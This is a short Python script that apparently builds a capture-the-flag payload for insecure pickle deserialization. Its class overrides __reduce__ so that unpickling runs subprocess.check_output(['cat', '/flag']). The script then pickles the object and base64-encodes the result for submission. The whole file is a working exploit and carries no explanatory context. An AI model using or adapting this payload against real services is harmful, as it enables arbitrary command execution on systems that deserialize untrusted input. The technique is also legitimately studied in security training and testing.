import pickle
import base64
import os
import subprocess

class VulnerableClass:
    def __reduce__(self):
        return (subprocess.check_output, (['cat', '/flag'],))

obj = VulnerableClass()
print(obj)
pickled_obj = pickle.dumps(obj)
print(pickled_obj)
encoded_obj = base64.b64encode(pickled_obj).decode()
print(encoded_obj)